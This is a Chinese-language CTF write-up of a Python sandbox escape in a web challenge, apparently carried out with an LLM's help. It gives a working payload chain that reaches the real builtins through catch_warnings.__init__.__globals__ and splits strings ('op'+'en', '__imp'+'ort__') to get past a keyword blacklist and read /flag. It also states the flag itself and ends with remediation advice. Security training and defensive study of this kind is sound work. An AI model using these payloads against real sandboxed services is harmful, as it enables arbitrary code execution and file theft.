# 永远的魔法使 · 渗透记录

## 2.1 基本信息
| 字段 | 内容 |
|---|---|
| 题目 | 永远的魔法使 |
| 类型 | Web / Python 沙箱逃逸 |
| 入口 | http://6a06qu5xkmh6vepz.neu-nex.fun |
| 耗时 | 0 日 0 时 1 分 10 秒 |
| LLM | deepseek-flash |
| flag | `nex{mAJO_kO1_nIKK1_ty6bpzu7}` |

## 2.2 目标与授权
- 授权范围：仅题目域名 80 端口；只执行读操作（读 /flag），未改文件/未横向
- 禁止动作：DoS、横向移动、持久化、读取无关数据

## 2.3 侦察与指纹
首页「Python 沙箱」textarea + /run；POST /run JSON {"code":...} 返回 {"output":...}；黑名单命中回「[沙箱] 检测到危险词: X」；exec 里 __builtins__ 是裁剪过的 dict

## 2.4 攻击面
1) POST /run {"code":...}（exec 执行点）2) GET /（前端提示 flag 在 /flag）

## 2.5 漏洞判定
- 类型：Web / Python 沙箱逃逸
- 位置：/run
- 证据：evidence/step5_resp.txt（真 builtins + open/read 读 /flag）；evidence/step6_resp.txt（os.open/os.read 系统调用独立复核）；evidence/step3_resp.txt（黑名单拦截）；evidence/step4_resp.txt（__builtins__ 被裁剪：__import__ 不在、子类数 491）
- 误报排除：黑名单只匹配源码子串：字面 open/read/import 被拦，但 'op'+'en'、're'+'ad'、'__imp'+'ort__' 运行期拼接可通过；裁剪后的 __builtins__['open'] 抛 KeyError（不是不存在 open，而是被删键），getattr(__builtins__,'open') 也不行，必须从 catch_warnings.__init__.__globals__ 取真 builtins；两条独立路径（builtins open/read 与 os syscall）回显同一 flag

## 2.6 利用链
```
GET / -> 前端提示 flag 在 /flag，入口 POST /run
POST /run {"code":"print(1+1)"} -> {"output":"2\n"}
POST /run {"code":"import os"} -> [沙箱] 检测到危险词: import
POST /run {"code":"print('__imp'+'ort__' in __builtins__)"} -> False（exec 的 __builtins__ 被裁剪）
POST /run: subs=().__class__.__base__.__subclasses__()
  c=[x for x in subs if x.__name__=='catch_warnings'][0]
  b=c.__init__.__globals__['__builtins__']   # 真 builtins
  f=b['op'+'en']('/flag'); print(getattr(f,'re'+'ad')())
  -> 200 {"output":"nex{mAJO_kO1_nIKK1_ty6bpzu7}\n\n"}
备路径：b['__imp'+'ort__']('os') -> os.open/os.read -> b'nex{mAJO_kO1_nIKK1_ty6bpzu7}\n'（同一 flag）
```

## 2.7 影响
沙箱内任意 Python 代码执行：可读 /flag 及容器内任意文件、列出目录、加载任意标准库；若容器有网络/挂载则会进一步扩大

## 2.8 修复建议
不要用「危险词子串黑名单」这种过滤；用 AST 白名单或 RestrictedPython，并配合低权限子进程 + 只读根文件系统 + seccomp/容器隔离；exec 时不要复用带真实 builtins 的 globals（尤其避免任意对象 __globals__ 可达）；flag 放沙箱外部或独立挂载

## 2.9 复盘
字面黑名单但 exec 的 __builtins__ 被裁剪；靠 catch_warnings.__globals__ 取真 builtins，拼字符串绕过后两条路都读到 flag。
